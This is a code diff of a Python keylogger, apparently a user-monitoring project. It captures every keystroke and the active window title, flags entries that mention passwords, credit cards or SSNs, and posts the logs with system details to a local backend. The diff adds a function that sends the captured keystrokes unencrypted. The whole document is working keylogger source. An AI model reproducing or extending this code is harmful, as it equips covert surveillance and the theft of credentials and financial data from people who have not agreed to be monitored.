@@ -11,8 +11,7 @@ import hashlib
 import json
 import ctypes
 import ctypes.wintypes
-
-# ==================== CONFIGURATION ====================
+#CONFIGURATION 
 CONFIG = {
     "BACKEND_URL": "http://localhost:4000/api/keylogger/data",
     "USER_ID": "67fa6a24415733da21dfde32",  # MongoDB ObjectId
@@ -24,22 +23,23 @@ CONFIG = {
         "microsoft.com", "apple.com"
     ],
     "UNSAFE_SITES": [
-         "amazon.com", "maliciousapp.net",
+        "amazon.com", "maliciousapp.net",
         "piratedmovies.com", "illegalcontent.net"
     ]
 }
 
-# ==================== INITIALIZATION ====================
+# INITIALIZATION
 try:
-    AES_KEY = CONFIG["ENCRYPTION_KEY"].ljust(32, b'\0')[:32]  # Ensure 32-byte AES-256 key
+    AES_KEY = CONFIG["ENCRYPTION_KEY"].ljust(32, b'\0')[:32]  # Padding the AES-256 key to 32-bytes 
     buffer = ""
     start_time = time.time()
     is_running = True
+    last_window_title = None  # Track the active window
 except Exception as e:
     print(f"Initialization error: {e}")
     exit(1)
 
-# ==================== UTILITY FUNCTIONS ====================
+# UTILITY FUNCTIONS 
 def get_system_info():
     return {
         "platform": platform.platform(),
@@ -67,7 +67,7 @@ def is_trusted_website(title):
 def is_unsafe_website(title):
     return any(site.lower() in title.lower() for site in CONFIG["UNSAFE_SITES"])
 
-# ==================== AES-256 ENCRYPTION ====================
+# AES-256 ENCRYPTION 
 def pad(data):
     pad_len = AES.block_size - len(data) % AES.block_size
     return data + chr(pad_len) * pad_len
@@ -83,17 +83,18 @@ def safe_encrypt(data):
         print(f"Encryption error: {e}")
         return data
 
-# ==================== DATA PROCESSING ====================
+#DATA PROCESSING 
 def detect_sensitive_data(text):
-    flags = []
+    # Detect sensitive data and return as a list of flagged items
+    sensitive_data = []
     text_lower = text.lower()
     if "password" in text_lower:
-        flags.append("Possible Password")
+        sensitive_data.append("Password detected")
     if ("card" in text_lower or "cc" in text_lower) and any(c.isdigit() for c in text):
-        flags.append("Possible Credit Card")
+        sensitive_data.append("Credit card detected")
     if "ssn" in text_lower or "social security" in text_lower:
-        flags.append("Possible SSN")
-    return flags
+        sensitive_data.append("SSN detected")
+    return sensitive_data
 
 def detect_anomalies(text):
     anomalies = []
@@ -109,20 +110,21 @@ def detect_anomalies(text):
         anomalies.append("Activity at odd hours")
     return anomalies
 
-# ==================== SEND TO SERVER ====================
-def send_to_server(data):
+# = SEND TO SERVER
+def send_to_server(data, sensitive_data, anomalies):
     try:
         timestamp = int(time.time())
         window_title = get_active_window_title()
 
+        # Prepare payload with sensitive data and anomalies
         payload = {
             "userId": CONFIG["USER_ID"],
             "keystrokes": safe_encrypt(data),
             "windowTitle": window_title,
             "isTrustedSite": is_trusted_website(window_title),
             "isUnsafeSite": is_unsafe_website(window_title),
-            "flags": detect_sensitive_data(data),
-            "anomalies": detect_anomalies(data),
+            "sensitiveData": sensitive_data,  # Added sensitive data
+            "anomalies": anomalies,  # Added anomalies
             "timestamp": timestamp,
             "systemInfo": get_system_info()
         }
@@ -145,26 +147,47 @@ def send_to_server(data):
     except Exception as e:
         print(f"Transmission error: {e}")
 
-# ==================== KEYSTROKE LISTENERS ====================
+def send_decrypted_to_server(data):
+    try:
+        timestamp = int(time.time())
+        window_title = get_active_window_title()
+
+        payload = {
+            "userId": CONFIG["USER_ID"],
+            "keystrokes": data,
+            "windowTitle": window_title,
+            "timestamp": timestamp,
+            "systemInfo": get_system_info()
+        }
+
+        response = requests.post(
+            "http://localhost:4000/api/keylogger/save-decrypted",
+            data=json.dumps(payload),
+            headers={"Content-Type": "application/json"},
+            timeout=5
+        )
+
+        if response.status_code != 201:
+            print(f"⚠️ Decrypted save failed: {response.status_code} {response.text}")
+
+    except Exception as e:
+        print(f"Decrypted transmission error: {e}")
+
+#  KEYSTROKE LISTENERS 
 def on_press(key):
-    global buffer, start_time
+    global buffer, start_time, last_window_title
     try:
         if not is_running:
             return False
         if key == keyboard.Key.enter:
             buffer += "\n"
-            log_buffer("[ENTER]")
-        elif key == keyboard.Key.space:
-            buffer += " "
-        elif key == keyboard.Key.tab:
-            buffer += "[TAB]"
-        elif key == keyboard.Key.backspace:
-            buffer += "[BACKSPACE]"
         elif hasattr(key, 'char') and key.char is not None:
             buffer += key.char
 
-        if len(buffer) >= CONFIG["MAX_BUFFER_SIZE"]:
-            log_buffer()
+        if get_active_window_title() != last_window_title:
+            last_window_title = get_active_window_title()
+            # Add timestamp when the active window changes
+            log_buffer(f"[WINDOW CHANGE] New active window: {last_window_title}")
 
     except Exception as e:
         print(f"Key processing error: {e}")
@@ -180,23 +203,37 @@ def log_buffer(extra_info=""):
     if buffer.strip():
         try:
             entry = buffer.strip()
-            if extra_info:
-                entry += f" {extra_info}"
-            send_to_server(entry)
-        finally:
-            buffer = ""
 
-# ==================== MAIN EXECUTION ====================
+            # Detect sensitive data
+            sensitive_data = detect_sensitive_data(entry)
+
+            # Detect anomalies
+            anomalies = detect_anomalies(entry)
+
+            if anomalies:
+                # Only flag sensitive data if there are anomalies
+                if sensitive_data:
+                    for item in sensitive_data:
+                        print(f"⚠️ Sensitive Data Detected: {item}")
+            
+            # Send encrypted keystrokes and anomalies to the server
+            send_to_server(entry, sensitive_data, anomalies)
+            send_decrypted_to_server(entry)
+        finally:
+            buffer = ""  # Flush the buffer after processing
+
+                            #MAIN EXECUTION 
 if __name__ == "__main__":
     try:
         def buffer_flusher():
             while is_running:
                 time.sleep(CONFIG["BUFFER_FLUSH_INTERVAL"])
-                log_buffer()
+                if buffer:
+                    log_buffer()
 
         threading.Thread(target=buffer_flusher, daemon=True).start()
 
-        print("🔒 Keylogger active... Press ESC to stop.")
+        print(" Keylogger active... Press ESC to stop.")
         with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
             listener.join()
 
